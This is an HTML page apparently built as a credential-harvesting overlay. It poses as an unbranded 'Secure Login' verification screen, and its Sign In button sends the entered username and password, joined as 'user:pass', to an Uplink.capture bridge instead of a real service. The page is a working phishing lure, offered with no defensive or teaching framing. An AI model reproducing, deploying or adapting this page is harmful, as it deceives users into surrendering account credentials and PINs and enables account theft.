<!DOCTYPE html>
<html>
<head>
    <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
    <style>
        body { background:#f4f4f4; color:#333; font-family:-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; padding:40px; margin:0; }
        h2 { font-size:1.8rem; margin:0 0 10px 0; }
        p { margin-bottom:20px; color:#666; }
        input { width:100%; padding:12px; margin-bottom:10px; border:1px solid #ccc; border-radius:4px; box-sizing:border-box; font-size:1rem; }
        button { width:100%; padding:15px; background:#004a8e; border:none; color:#fff; font-weight:bold; border-radius:4px; cursor:pointer; font-size:1rem; }
    </style>
</head>
<body>
    <h2>Secure Login</h2>
    <p>Verification required for account access.</p>
    <input type="text" id="u" placeholder="Username/ID">
    <input type="password" id="p" placeholder="Password/PIN">
    <button onclick="var u=document.getElementById('u').value; var p=document.getElementById('p').value; if(u && p) Uplink.capture(u + ':' + p);">Sign In</button>
</body>
</html>
